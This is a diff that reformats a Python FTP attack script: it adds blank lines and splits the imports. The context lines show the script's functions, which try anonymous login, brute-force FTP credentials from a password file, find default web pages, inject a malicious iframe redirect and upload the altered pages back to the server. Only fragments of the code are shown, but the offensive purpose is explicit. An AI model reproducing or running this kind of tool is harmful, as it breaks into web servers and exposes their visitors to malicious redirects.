@@ -1,8 +1,11 @@
-#<--*--coding:utf-8--*-->
-import ftplib, optparse, time
+# -*-coding:utf-8 -*-
+import ftplib
+import optparse
+import time
 
 ANONYMOUS = 'Anonymous'
 ANONYMOUS_EMAIL = 'vme@your.com'
+
 
 def anonLogin(hostname):
     '''
@@ -17,6 +20,7 @@ def anonLogin(hostname):
     except:
         print('[*] ' + str(hostname) + ' FTP Anonymous Logon Failed.')
         return False
+
 
 def bruteLogin(hostname, passwdFile):
     '''
@@ -39,6 +43,7 @@ def bruteLogin(hostname, passwdFile):
     print('[-] Could not brute force FTP credentials.')
     return (None, None)
 
+
 def returnDefault(ftp):
     '''
     Check that the server provides the web service
@@ -58,6 +63,7 @@ def returnDefault(ftp):
         retList.append(fileName)
     return retList
 
+
 def injectPage(ftp, page, redirect):
     '''
     1、Download the web page from the attack server.
@@ -71,6 +77,7 @@ def injectPage(ftp, page, redirect):
     print('[+] Injected Malicious IFrame on: '+page)
     ftp.storlines('STOR ' + page, open(page + '.tmp'))
     print('[+] Uploaded Injected Page: ' + page)
+
 
 def attack(username, password, tgtHost, redirect):
     '''
@@ -108,6 +115,7 @@ def main():
             if password:
                 print('[+] Using Creds: %s/%s to attak.'%(username, password))
                 attack(username, password, tgtHost, redirect)
+
 
 if __name__ == '__main__':
     main()
